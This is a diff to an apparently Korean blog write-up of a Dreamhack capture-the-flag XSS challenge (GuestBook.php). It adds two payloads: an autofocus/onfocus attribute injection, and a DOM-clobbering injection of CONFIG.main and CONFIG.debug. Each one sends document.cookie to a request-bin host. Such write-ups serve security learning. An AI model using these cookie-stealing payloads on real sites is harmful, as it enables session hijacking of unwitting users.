@@ -21,6 +21,12 @@ function addLink($content){
 
 결국에는 문뜩 생각이 나서 풀었는데, onfocus 이벤트와 autofocus 속성을 이용해서 해결할 수 있었다..
 
+<br>
+
+```[a](' autofocus onfocus='javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie)```
+
+<br>
+
 근데 풀이를 보면 Dom Clobbering으로도 풀 수가 있었다..
 
 <br>
@@ -84,3 +90,9 @@ CONFIG의 키에 main과 debug 값을 추가해줘야 한다.
 이렇게 id에 CONFIG, name에 각각 debug와 main을 넣어준다면 console 창에서 window.CONFIG를 했을 때, HTMLCollection이 나오면서 키 값으로 main과 debug가 있음을 알 수 있다.
 
 위의 코드를 ```GuestBook.php/?content=```에서 넣어주면 코드가 실행이 된다!!!!
+
+<br>
+
+```
+GuestBook.php/?content=[a](javascript:location.href=`http://bzbxhgx.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='main)%0d%0a[a](javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='debug)
+```
